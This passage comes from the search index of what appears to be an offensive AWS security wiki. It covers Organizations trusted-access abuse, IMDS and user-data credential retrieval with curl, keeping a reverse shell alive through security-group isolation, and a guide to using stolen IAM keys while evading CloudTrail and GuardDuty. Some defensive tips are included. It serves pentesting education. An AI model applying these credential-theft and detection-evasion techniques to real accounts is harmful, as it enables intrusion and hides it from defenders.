account/delegated admin to another member account in the organization. Depending on the features available, this might allow for indirect access to other member accounts (ex. IAM Access Analyzer), or direct access with some setup (IAM Identity Center).</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#organization-integrated-features","title":"Organization-Integrated Features","text":"<p>Many AWS services include specific features that have the capability to scope to the entire organization. For example, IAM Access Analyzer is a feature within the overall IAM service. Normally a user would just run Access Analyzer on their own AWS account to find roles with trust policies that reference outside AWS account sources. Because IAM Access Analyzer is an organization-integrated feature, if the target AWS account is part of an organization, a user can choose to scope Access Analyzer from their single account to the organization meaning Access Analyzer will check all AWS account roles in the organization and consider \"untrusted\" sources as any resource outside of the organization (as opposed to the single AWS account). IAM Access Analyzer is just one example, but there are a multitude of features that can do a similar scope increase to the organization that all behave differently. This might sound complicated, but from a UI perspective, this basically just means there is another option in the dropdown or radio buttons when kicking off the service that lets you choose \"organization\" instead of the specifc account you are in. A list of all these can be found here</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#helpful-diagram","title":"Helpful Diagram","text":"<p> Trusted Access &amp; Delegated Administration</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#trusted-access","title":"Trusted Access","text":"<p>These organization integrated features are in an \"off\" state by default. Trusted access is the act of the management account turning \"on\" the organization integrated features. For example, even if a member account is part of an organization, they will not be able to increase the scope of IAM Access Analyzer to the organization until the management account enables trusted access for IAM Access Analyzer for the organization. On a technical level, the act of turning \"on\" an organization-integrated feature via trusted access allows the feature to make roles in member accounts to carry out its tasks. There is an AWS CLI command the management account can run to enable one of these organization-integrated features and list those that are present as seen below:</p> <p></p> <p>Note</p> <p>Trusted access is enabled via the management account and allows IAM Access Analyzer to reach into all member accounts to achieve its objective.</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#delegated-administration","title":"Delegated Administration","text":"<p>Delegated Administration is pretty much like trusted access, but is from the perspective of a member account. In delegated administration, the user allows one of the member accounts to execute an organization-integrated feature on the AWS organization, essentially \"delegating\" the \"administration\" of that feature to that member account. We would say that a member account is \"a delegated administrator for service ABC (ex. IAM Access Analyzer).\" The CLI command to see all delegated administrators in an organization is shown below. If you are a member account, and call this API, and your AWS account is listed in the output, than that is a good way to confirm you are in a delegated admin account. Note again that a delegated admin is for a specific service so rather than searching through every single feature to see what you are a delegated admin for, you can call the API shown below to see what specific feature you are a delegated admin for.</p> <p></p> <p>Besides the ability to run specific organization-integrated features, note that the member account also in general gains access to numerous read-only APIs. For example, note how this CLI command states that a \"delegated administrator\" can run it. While a default member account can only see itself and the management account in an organization, a delegated administrator can potentially see all AWS accounts in the organization. </p> <p>As of late 2022, delegated administrators also potentially have the ability to manipulate SCPs (which are basically IAM policy filters at the organization level). See the attached blog article for a review of this avenue.</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#iam-access-analyzer-indirect-route","title":"IAM Access Analyzer (Indirect Route):","text":"<p>IAM Access Analyzer allows one to scan all roles in the organization. If an attacker compromises the managament account where trusted access is enabled for IAM Access Analyzer (or the attacker enables it depending on permissions), the attacker could run IAM Access Analyzer on the entire organization and review the results to see if there are any misconfigured roles they can pivot to. Note the attacker NEVER directly got access to the member accounts and was constrained to the management account. Rather the attacker just ran the organization-integrated feature which accesses the member accounts giving the attacker indirect access to the organization. See the blog post in references for images/walkthrough.</p> <p>Now imagine an attacker compromises a member account. If the member account is a delegated administrator for IAM Access Analyzer, the attacker can perform a similar action of launching the feature and reviewing the results without ever directly accessing the member accounts. In addition, if a delegated administrator is compromised, the attacker can also see much more of the organization and what the structure looks like due to their read-only rights. See the blog post in references for images/walkthrough.</p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#iam-identity-center-direct-route","title":"IAM Identity Center (Direct Route)","text":"<p>IAM Identity center supports trusted access, and allows one to create a user entity, a permission set, and attach the user and permission set to an account in the organization. So, if an attacker compromises a management account, the attacker could enable trusted access for IAM Identity Center (assuming it is not already enabled). Then the attacker (if they have the necessary permissions), can create a user entity with a username/password and the attacker email, and create a permission set entity that is the equivalent of AdministratorAccess. The attacker can then attach the user and permissions to a member account in the organization through IAM Identity Center in the management account, and navigate to the IAM Identity Center login link. The attacker then can enter the users username/password and get access to the member account directly as Administrator Access. See the references section for the blog post with images/walkthrough/etc. </p>"},{"location":"aws/general-knowledge/aws_organizations_defaults/#automated-tools","title":"Automated Tools","text":"<p>To enumerate an organization for all the info discussed above, you can use the Pacu module shown below:</p> <pre><code># Run Module\nPacu (Session: Keys) &gt; run organizations__enum\n\n# See Data Collected/Enumerated\nPacu (Session: Keys) &gt; data organizations\n</code></pre> <p>Relevant pull requests can be found here and here.</p>"},{"location":"aws/general-knowledge/block-expensive-actions-with-scps/","title":"Prevent Expensive AWS API Actions with SCPs","text":"<ul> <li> <p> Original Research</p> <p> <p> List of expensive / long-term effect AWS IAM actions by Ian McKay</p> <p></p> </p> </li> <li> <p> Additional Resources</p> <ul> <li>Service Control Policies (SCPs)</li> <li>Attaching and detaching service control policies</li> </ul> </li> </ul> <p>An ever-present danger when using AWS is accidentally making an API call that could cost you thousands of dollars. Speaking from experience, this can be a remarkably stressful time. To mitigate this risk, implementing guardrails on your account is essential. One way to do this is to block API operations which are known to be expensive. Operations like signing up for certain AWS services or creating non-deletable resources can lead to high costs.</p>"},{"location":"aws/general-knowledge/block-expensive-actions-with-scps/#understanding-service-control-policies","title":"Understanding Service Control Policies","text":"<p>To help prevent billing headaches when learning about AWS security or conducting research we can use a Service Control Policy (SCP). An SCP is a type of organizational policy which restricts what API calls can be made by member accounts in an AWS Organization. Thanks to the work of Ian McKay, and other community members, we have a list of AWS API operations which are prohibitively expensive and should be avoided. </p> <p>To implement the policy below, refer to the AWS documentation for detailed instructions on attaching and managing SCPs.</p> <p>Warning</p> <p>While this SCP provides a significant safeguard, it is not entirely foolproof. You can still incur high charges if not careful. This policy only blocks known problematic API calls. Always exercise caution when creating or configuring resources in AWS.</p>"},{"location":"aws/general-knowledge/block-expensive-actions-with-scps/#safeguard-scp","title":"Safeguard SCP","text":"<pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"Statement1\",\n      \"Effect\": \"Deny\",\n      \"Action\": [\n        \"route53domains:RegisterDomain\",\n        \"route53domains:RenewDomain\",\n        \"route53domains:TransferDomain\",\n        \"ec2:ModifyReservedInstances\",\n        \"ec2:PurchaseHostReservation\",\n        \"ec2:PurchaseReservedInstancesOffering\",\n        \"ec2:PurchaseScheduledInstances\",\n        \"rds:PurchaseReservedDBInstancesOffering\",\n        \"dynamodb:PurchaseReservedCapacityOfferings\",\n        \"s3:PutObjectRetention\",\n        \"s3:PutObjectLegalHold\",\n        \"s3:BypassGovernanceRetention\",\n        \"s3:PutBucketObjectLockConfiguration\",\n        \"elasticache:PurchaseReservedCacheNodesOffering\",\n        \"redshift:PurchaseReservedNodeOffering\",\n        \"savingsplans:CreateSavingsPlan\",\n        \"aws-marketplace:AcceptAgreementApprovalRequest\",\n        \"aws-marketplace:Subscribe\",\n        \"shield:CreateSubscription\",\n        \"acm-pca:CreateCertificateAuthority\",\n        \"es:PurchaseReservedElasticsearchInstanceOffering\",\n        \"outposts:CreateOutpost\",\n        \"snowball:CreateCluster\",\n        \"s3-object-lambda:PutObjectLegalHold\",\n        \"s3-object-lambda:PutObjectRetention\",\n        \"glacier:InitiateVaultLock\",\n        \"glacier:CompleteVaultLock\",\n        \"es:PurchaseReservedInstanceOffering\",\n        \"backup:PutBackupVaultLockConfiguration\",\n        \"bedrock:CreateProvisionedModelThroughput\",\n        \"bedrock:UpdateProvisionedModelThroughput\"\n      ],\n      \"Resource\": [\n        \"*\"\n      ]\n    }\n  ]\n}\n</code></pre>"},{"location":"aws/general-knowledge/connection-tracking/","title":"Connection Tracking","text":"<ul> <li> <p> Original Research</p> <p> <p>Abusing AWS Connection Tracking by Nick Frichette</p> <p></p> </p> </li> </ul> <p>Security Groups in AWS have an interesting capability known as Connection Tracking. This allows the security groups to track information about the network traffic and allow/deny that traffic based on the Security Group rules.</p> <p>There are two kinds of traffic flows; tracked and untracked. For example the AWS documentation mentions a tracked flow as the following, \"if you initiate an ICMP ping command to your instance from your home computer, and your inbound security group rules allow ICMP traffic, information about the connection (including the port information) is tracked. Response traffic from the instance for the ping command is not tracked as a new request, but rather as an established connection and is allowed to flow out of the instance, even if your outbound security group rules restrict outbound ICMP traffic\".</p> <p>An interesting side effect of this is that tracked connections are allowed to persist, even after a Security Group rule change. </p> <p>Let's take a simple example: There is an EC2 instance that runs a web application. This EC2 instance has a simple Security Group that allows SSH, port 80, and port 443 inbound, and allows all traffic outbound. This EC2 instance is in a public subnet and is internet facing.</p> <p></p> <p>While performing a penetration test you've gained command execution on this EC2 instance. In doing so, you pop a simple reverse shell. You work your magic on the box before eventually triggering an alert to our friendly neighborhood defender. They follow their runbooks which may borrow from the official AWS whitepaper on incident response. </p> <p>As part of the \"Isolate\" step, the typical goal is to isolate the affected EC2 instance with either a restrictive Security Group or an explicit Deny NACL. The slight problem with this is that NACLs affect the entire subnet, and if you are operating in a space with a ton of EC2 instances the defender is unlikely to want to cause an outage for all of them. As a result, swapping the Security Group is the recommended procedure.</p> <p>The defender switches the Security Group from the web and ssh one, to one that does not allow anything inbound or outbound.</p> <p></p> <p>The beauty of connection tracking is that because you've already established a connection with your shell, it will persist. So long as you ran the shell before the SG change, you can continue scouring the box and looking for other vulnerabilities.</p> <p></p> <p>To be clear, if the restrictive security group doesn't allow for any outbound rules we won't be able to communicate out (and if you're using a beaconing C2 that will not function).</p> <p></p>"},{"location":"aws/general-knowledge/iam-key-identifiers/","title":"IAM ID Identifiers","text":"<ul> <li> <p> Additional Resources</p> <p>Reference: AWS Documentation: Unique Identifiers</p> </li> </ul> <p>In AWS, different resources are assigned a \"unique identifier\". This identifier is a unique, 21 character value. The first four characters of the identifier are a prefix to denote the type of resource it represents.</p> <p>The full list of prefixes can be found below.</p> Prefix Entity Type ABIA AWS STS service bearer token ACCA Context-specific credential AGPA Group AIDA IAM user AIPA Amazon EC2 instance profile AKIA Access key ANPA Managed policy ANVA Version in a managed policy APKA Public key AROA Role ASCA Certificate ASIA Temporary (AWS STS) keys <p>From a security perspective, there are 2 primary prefixes which are important to know, <code>AKIA</code> and <code>ASIA</code>.</p>"},{"location":"aws/general-knowledge/iam-key-identifiers/#akia","title":"AKIA","text":"<p>IAM credentials with the <code>AKIA</code> prefix belong to long lived access keys. These are associated with IAM users. These credentials can potentially be exposed and used by attackers. Because they do not expire by default, they serve as an excellent vehicle to gain initial access to an AWS environment.</p>"},{"location":"aws/general-knowledge/iam-key-identifiers/#asia","title":"ASIA","text":"<p>IAM credentials with the <code>ASIA</code> prefix belong to short lived access keys which were generated using STS. These credentials last for a limited time. In the event you come across an access key prefixed with <code>ASIA</code>, a secret key, and a session token, make use of them quickly before they expire.</p>"},{"location":"aws/general-knowledge/intro_metadata_service/","title":"Introduction to the Instance Metadata Service","text":"<p>Every EC2 instance has access to the instance metadata service (IMDS) that contains metadata and information about that specific EC2 instance. In addition, if an IAM Role is associated with the EC2 instance, credentials for that role will be in the metadata service. Because of this, the instance metadata service is a prime target for attackers who gain access to an EC2 instance.</p>"},{"location":"aws/general-knowledge/intro_metadata_service/#how-to-access-the-metadata-service","title":"How to Access the Metadata Service","text":"<p>The metadata service can be accessed at <code>http://169.254.169.254/latest/meta-data/</code> from the EC2 instance. Alternatively, it can also be reached via IPv6 at <code>http://[fd00:ec2::254]/latest/meta-data/</code> however this only applies to Nitro EC2 instances.</p> <p>To get credentials, you will first need to make a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. The response to this will return the name of the IAM role associated with the credentials. You then make a subsequent request to retrieve the IAM credentials at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/*role_name*/</code>. </p>"},{"location":"aws/general-knowledge/intro_metadata_service/#imdsv2","title":"IMDSv2","text":"<p>Version two of the metadata service has added protections against SSRF and requires the user to create and use a token. You can access it via the following.</p> <pre><code>user@host:~$ TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\nuser@host:~$ curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/meta-data/\n</code></pre>"},{"location":"aws/general-knowledge/intro_metadata_service/#the-security-benefits-of-imdsv2","title":"The Security Benefits of IMDSv2","text":"<p>IMDSv2 offers a number of security improvements over the original. Wherever possible, IMDSv2 should be enforced over the original metadata service. These improvements take the following form:</p> <p>Session Authentication: In order to retrieve information from the metadata service a session must be created by sending a HTTP PUT request to retrieve a token value. After this, the token must be used for all subsequent requests. This mechanism effectively mitigates traditional Server Side Request Forgery attacks, as an attacker is unlikely to be able to send a PUT request.</p> <p>Blocks X-Forwarded-For Header: IMDSv2 will block requests to fetch a token that include the X-Forwarded-For header. This is to prevent misconfigured reverse proxies from being able to access it.</p> <p>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.</p> <p>Note</p> <p>While the default configuration of IMDSv2 will prevent a Docker container from being able to reach the metadata service, this can be configured via the \"hop limit.\"</p>"},{"location":"aws/general-knowledge/intro_metadata_service/#what-info-the-metadata-service-contains","title":"What Info the Metadata Service Contains","text":"<p>The following information was pulled from here.</p> Endpoint Description ami-id The AMI ID used to launch the instance. ami-launch-index If you started more than one instance at the same time, this value indicates the order in which the instance was launched. The value of the first instance launched is 0. ami-manifest-path The path to the AMI manifest file in Amazon S3. If you used an Amazon EBS-backed AMI to launch the instance, the returned result is unknown. hostname The private IPv4 DNS hostname of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0). iam/info If there is an IAM role associated with the instance, contains information about the last time the instance profile was updated, including the instance's LastUpdated date, InstanceProfileArn, and InstanceProfileId. Otherwise, not present. iam/security-credentials/role-name If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role. Otherwise, not present. identity-credentials/ec2/info [Internal use only] Information about the credentials in identity-credentials/ec2/security-credentials/ec2-instance. These credentials are used by AWS features such as EC2 Instance Connect, and do not have any additional AWS API permissions or privileges beyond identifying the instance. instance-id The ID of this instance. local-hostname The private IPv4 DNS hostname of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0). local-ipv4 The private IPv4 address of the instance. In cases where multiple network interfaces are present, this refers to the eth0 device (the device for which the device number is 0). public-hostname The instance's public DNS. This category is only returned if the enableDnsHostnames attribute is set to true. public-ipv4 The public IPv4 address. If an Elastic IP address is associated with the instance, the value returned is the Elastic IP address. public-keys/0/openssh-key Public key. Only available if supplied at instance launch time. security-groups The names of the security groups applied to the instance."},{"location":"aws/general-knowledge/introduction_user_data/","title":"Introduction to User Data","text":"<p>Instance user data is used to run commands when an EC2 instance is first started or after it is rebooted (with some configuration). Because this script is typically used to install software and configure the instance, this can be an excellent source of information for us as attackers. After gaining access to an EC2 instance you should immediately grab the user data script to gain information on the environment.</p> <p>Warning</p> <p>Although it should not be done, credentials/secrets often end up being stored in user data. From the AWS docs, \"Although you can only access instance metadata and user data from within the instance itself, the data is not protected by authentication or cryptographic methods. Anyone who has direct access to the instance, and potentially any software running on the instance, can view its metadata. Therefore, you should not store sensitive data, such as passwords or long-lived encryption keys, as user data.\"</p>"},{"location":"aws/general-knowledge/introduction_user_data/#how-to-access-ec2-user-data","title":"How to Access EC2 User Data","text":"<p>User data can be accessed at <code>http://169.254.169.254/latest/user-data/</code> from the EC2 instance.</p>"},{"location":"aws/general-knowledge/introduction_user_data/#imdsv2","title":"IMDSv2","text":"<p>Version two of the metadata service has added protections against SSRF and requires the user to create and use a token. You can access it via the following.</p> <pre><code>user@host:~$ TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\nuser@host:~$ curl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre>"},{"location":"aws/general-knowledge/introduction_user_data/#api","title":"API","text":"<p>Another option to gather user data is via the API. If you escalate privileges in an account, or simply compromise a user/role with sufficient permissions, you can query the AWS API to view the user data of specific EC2 instances. This requires you to know the instance-id of the target EC2 instance. To query the user data we will use the describe-instance-attribute action. The result will be base64 encoded.</p> <pre><code>user@host:~$ aws ec2 describe-instance-attribute --instance-id i-abc123... --attribute userData\n</code></pre>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/","title":"Using Stolen IAM Credentials","text":"<p>As a Penetration Tester or Red Teamer it is likely you will stumble into AWS IAM credentials during an assessment. The following is a step by step guide on how you can use them, things to consider, and methods to avoid detection.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#iam-credential-characteristics","title":"IAM Credential Characteristics","text":"<p>In AWS there are typically two types of credentials you will be working with, long term (access keys) and short term.</p> <p>Long term credentials will have an access key that starts with <code>AKIA</code> and will be 20 characters long. In addition to the access key there will also be a secret access key which is 40 characters long. With these two keys, you can potentially make requests against the AWS API. As the name implies, these credentials have no specified lifespan and will be useable until they are intentionally disabled/deactivated. As a result, this makes them not recommended from a security perspective. Temporary security credentials are preferred.</p> <p>Temporary credentials, by comparison, will have an access key that starts with <code>ASIA</code>, be 20 characters long, and also have a 40 character secret key. In addition, temporary security credentials will also have a session token (sometimes referred to as a security token). The session token will be base64 encoded and quite long. With these 3 credentials combined you can potentially make requests to the AWS API. As the name implies, these credentials have a temporary lifespan that is determined when they were created. It can be as short as 15 minutes, and as long as several hours.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#working-with-the-keys","title":"Working with the Keys","text":"<p>After gathering the credentials you will likely want to use them with the AWS CLI. There are a few ways to do this, however setting them as environment variables is likely the easiest. </p> <p>To do this with long term credentials, set the following environment variables.</p> <pre><code>export AWS_ACCESS_KEY_ID=AKIAEXAMPLEEXAMPLEEE\nexport AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM\n</code></pre> <p>To do this with short term credentials, set the following environment variables.</p> <pre><code>export AWS_ACCESS_KEY_ID=ASIAEXAMPLEEXAMPLEEE\nexport AWS_SECRET_ACCESS_KEY=EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLESEXAM\nexport AWS_SESSION_TOKEN=EXAMPLEEXAMPLEEXAMPLE...&lt;snip&gt;\n</code></pre> <p>Note</p> <p>You may also have to specify an AWS region. This can be globally set with the <code>aws configure</code> command or through the <code>AWS_REGION</code> environment variable.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#determining-validity","title":"Determining Validity","text":"<p>Now that you have credentials and have them setup to use, how can you determine if they are valid (not expired or deactivated)? The simplest way would be to make use of the sts:GetCallerIdentity API call. This method is helpful because it will allow us to determine if the credentials are valid and it will also tell us useful information such as the name of the role/user associated with these credentials and the AWS account ID they belong to.</p> <p>As an added bonus, we can be confident this API call will always work. From the documentation, \"No permissions are required to perform this operation. If an administrator adds a policy to your IAM user or role that explicitly denies access to the sts:GetCallerIdentity action, you can still perform this operation\".</p> <pre><code>$ aws sts get-caller-identity\n{\n    \"UserId\": \"AROAEXAMPLEEXAMPLEEXA:Nick\",\n    \"Account\": \"123456789123\",\n    \"Arn\": \"arn:aws:sts::123456789123:assumed-role/blah/Nick\"\n}\n</code></pre> <p>Tip</p> <p>For defensive security professionals, it may be worthwhile to alert on invocations of <code>sts:GetCallerIdentity</code> from identities that have no history of calling it. For example, if an application server in a production environment has never called it before, that may be an indication of compromise.</p> <p>It is worth noting that <code>sts:GetCallerIdentity</code> may be legitimately used by a large number of projects, and that individual developers may use it as well. To attempt to reduce the number of false positives, it would be best to only alert on identities which have no history of calling it.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#operational-security-considerations","title":"Operational Security Considerations","text":"<p>If you are attempting to maintain stealth, <code>sts:GetCallerIdentity</code> may be a risk. This API call logs to CloudTrail which means that defenders will have a log with additional details that this occurred. To get around this, we can make use of data events.</p> <p>Data events are high-volume API calls for resources in an AWS account. Because of the number of times these APIs may be called, they are not logged to CloudTrail by default and in some cases they cannot be logged at all.</p> <p>An example of this would be sqs:ListQueues. By making this API call we can get similar information to <code>sts:GetCallerIdentity</code> without the risk of logging to CloudTrail.</p> <pre><code>user@host:~$ aws sqs list-queues\n\nAn error occurred (AccessDenied) when calling the ListQueues operation: User: arn:aws:sts::123456789012:assumed-role/no_perms/no_perms is not authorized to perform: sqs:listqueues on resource: arn:aws:sqs:us-east-1:123456789012: because no identity-based policy allows the sqs:listqueues action\n</code></pre> <p>For more information on this technique, please see its article.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#avoiding-detection","title":"Avoiding Detection","text":"<p>There are situations where simply using the credentials could alert defenders to your presence. As a result, it is a good idea to be mindful of these circumstances to avoid being caught.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#guardduty-pentest-findings-and-cli-user-agents","title":"GuardDuty Pentest Findings and CLI User Agents","text":"<p>If you are using a \"pentesting\" Linux distribution such as Kali Linux, Parrot Security, or Pentoo Linux you will immediately trigger a PenTest GuardDuty finding. This is because the AWS CLI will send along a user agent string which contains information about the operating system making the API call.</p> <p>In order to avoid this, it is best to make use of a \"safe\" operating system, such as Windows, Mac OS, or Ubuntu. If you are short on time, or simply MUST use one of these Linux distributions, you can modify your botocore library with a hard-coded user agent.</p> <p>Tip</p> <p>Are you going up against an apex blue team who will detect anything? It may be a good idea to spoof a user agent string that one would expect in the environment. For example, if these IAM credentials belong to a developer who uses a Windows workstation, it would be very strange for API calls to suddenly start having a user agent with a Linux operating system.</p> <p>Defenders, this may also be worth looking into for detection purposes.</p> <p>For more information on this, please see its article.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#guardduty-credential-exfiltration","title":"GuardDuty Credential Exfiltration","text":"<p>Note</p> <p>This section only applies to IAM credentials taken from the Instance Metadata Service of an EC2 instance. It does not apply to other IAM credentials.</p> <p>When using IAM credentials taken from an EC2 instance, you run the risk of triggering the UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS GuardDuty finding. This finding alerts on scenarios in which IAM credentials from an EC2 instance are used from outside AWS (E.X your home IP address).</p> <p>This is particularly relevant in scenarios in which you have access to the IAM credentials, but not the host (Server Side Request Forgery).</p> <p>To get around this, we can make use of VPC Endpoints which will not trigger this alert. To make things easier, the SneakyEndpoints tool was developed to allow you to quickly stand up infrastructure to bypass this detection.</p> <p>For more information on this, please see its article.</p>"},{"location":"aws/general-knowledge/using_stolen_iam_credentials/#situational-awareness","title":"Situational Awareness","text":"<p>Now that you have everything set up and you know what to look out for, your next question may be, \"what is in this AWS account?\". If you are performing a no-knowledge assessment, and thus, don't have any insights into what services are running in the account, it makes it difficult to know what to target or look into.</p> <p>One option would be to enumerate the service-linked roles in the account. A service-linked role is a special kind of IAM role that allows an AWS service to perform actions in your account. Because of this, we can potentially enumerate them without authentication. </p> <p>From the previous validity checking step, we will know the AWS account ID we are operating in. That, combined with this technique will allow us to enumerate what services the AWS account uses. This can be helpful to answer questions such as, \"Is our target using GuardDuty? Is this account a part of an organization? Are they using containers (ECS, EKS), or are they using EC2?\".</p> <p>For more information on this, please see its article.</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/","title":"Why Recreating an IAM Role Doesn't Restore Trust: A Gotcha in Role ARNs","text":"<p>TL;DR: In AWS IAM, trust policies often reference other roles by their Amazon Resource Name (ARN). But if a referenced IAM role is deleted and recreated, even with the same name, the trust policy breaks. The new role may look identical, but AWS assigns it a different internal identity, and trust relationships no longer apply.</p> <p>This subtle behavior can disrupt cross-account access, third-party integrations, and automation workflows.</p> <p>Info</p> <p>While this article is primarily focused on IAM roles and avoiding making this mistake in a SaaS context, it is important to know that the same idea applies to IAM users as well. In addition, IAM principals can be referenced in resource-based policies of a variety of resources, not just role trust policies.</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#the-scenario","title":"The Scenario","text":"<p>Imagine you have a trust policy attached to a role named <code>Bobby</code> and that this trust policy permits the role named <code>Megan</code> to assume it as shown below.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::111111111111:role/Megan\"\n            },\n            \"Action\": \"sts:AssumeRole\",\n            \"Condition\": {}\n        }\n    ]\n}\n</code></pre> <p>If the <code>Megan</code> role is deleted and then recreated, perhaps using automation or Terraform, users may expect this policy to continue working. After all, the ARN is the same, why wouldn't it work? Well, how about we delete the Megan role, recreate it, and see what happens to the trust policy?</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#deleting-and-recreating-the-role","title":"Deleting and Recreating the Role","text":"<p>Should we delete <code>Megan</code>, then recreate her role and check back in on <code>Bobby</code>'s trust policy we will find it now looks like this:</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"AROAABCDEFGHIJKLMNOPQ\"\n            },\n            \"Action\": \"sts:AssumeRole\",\n            \"Condition\": {}\n        }\n    ]\n}\n</code></pre> <p>What happened? Where did the ARN go? Megan?</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#why-this-happens","title":"Why This Happens","text":"<p>At first glance, it\u2019s easy to assume that the ARN of a role is its unique identifier. After all, it's what we use in trust policies, logs, error messages, and Terraform or CloudFormation templates. It looks like a primary key, acts like a primary key, so it must be the primary key, right?</p> <p>Not quite.</p> <p>Under the hood, AWS assigns each IAM role an internal, immutable principal ID when it is created. This principal ID, not the ARN, is what actually identifies the role in trust relationships, policy evaluations, and service-level authorizations.</p> <p>The ARN is best thought of as a human-readable label, similar to a username. It\u2019s a convenient pointer, but it\u2019s not the source of truth. When you delete a role, AWS also discards the associated principal ID. Recreating a role, even with the exact same name, results in a completely new role with a new principal ID. The ARN may be identical, but the underlying identity is not.</p> <p>This is why a trust policy that still references the original ARN will be replaced with the principal ID: it's pointing to an identity that no longer exists. The policy is technically valid JSON, but AWS can no longer resolve that ARN to a live principal with the matching principal ID.</p> <p>AWS explicitly calls this out in their IAM documentation:</p> <p>If your <code>Principal</code> element in a role trust policy contains an ARN that points to a specific IAM role, then that ARN transforms to the role (sic) unique principal ID when you save the policy. This helps mitigate the risk of someone escalating their privileges by removing and recreating the role. You don't normally see this ID in the console, because IAM uses a reverse transformation back to the role ARN when the trust policy is displayed. However, if you delete the role, then you break the relationship. The policy no longer applies, even if you recreate the role because the new role has a new principal ID that does not match the ID stored in the trust policy</p> <p>This is further elaborated in this re:Post article.</p> <p>Note</p> <p>This behavior has an additional benefit for enumeration. We can use resource based policies to convert the Principal ID to an ARN.</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#why-this-is-a-good-thing","title":"Why This is a Good Thing","text":"<p>While frustrating at times, this behavior is a security feature. It prevents someone from deleting a trusted IAM role and then recreating it to inherit that trust, which could otherwise lead to unintended privilege escalation or lateral movement.</p> <p>By locking trust relationships to unique principal IDs, AWS ensures that trust must be explicit and intentional, not assumed by name reuse.</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#why-this-may-be-dangerous","title":"Why this may be Dangerous","text":"<p>While tying trust relationships to immutable principal IDs is a sound security decision, this behavior can introduce operational risk, especially in SaaS integrations.</p> <p>Many SaaS platforms, especially in the security, observability, or data pipeline space, allow customers to establish integrations by trusting a specific IAM role via an ARN. The SaaS provider configures their side to call <code>sts:AssumeRole</code> on a role in a customer\u2019s AWS account and uses that role to perform whatever their service needs to do.</p> <p>Say that SaaS provider makes a mistake and deletes the trusted IAM Role and recreates it (intentionally or not), that new IAM role will have a different principal ID. While the ARN may be the same, from AWS' perspective that is not the same IAM role. The result? </p> <p>The SaaS provider will not be able to assume any of their customer roles.</p> <p>To make matters worse, the only solution in this situation is for every single customer to modify the trust policy of their SaaS roles in every single AWS account to trust the new IAM role in the SaaS account. This can introduce downtime, addition support requests, and other issues.</p>"},{"location":"aws/general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/#how-to-avoid-this","title":"How to Avoid This","text":"<p>The simplest method for avoiding this operational risk is to have your SaaS customer trust an entire AWS account, and not a specific IAM role. Below is an example of such a trust policy.</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"AWS\": \"arn:aws:iam::111111111111:root\"\n            },\n            \"Action\": \"sts:AssumeRole\"\n        }\n    ]\n}\n</code></pre> <p>This trust policy will permit any AWS principal in the account <code>111111111111</code> to assume the role in the customer account. </p> <p>Warning</p> <p>It is important that you restrict who has access to the trusted account and limit what principals have <code>sts:AssumeRole</code> privileges.</p> <p>As an alternative, you can modify the trust policy to trust the entire AWS account and then use a <code>Condition</code> block to restrict access to a specific role ARN. Unlike when a role ARN is listed directly in the <code>Principal</code> field, using <code>aws:PrincipalArn</code> in a condition does not evaluate the principal's role ID, it matches only the string value of the ARN. This means that if you delete and recreate the role with the same name, the trust policy will continue to work as long as the ARN matches.</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": 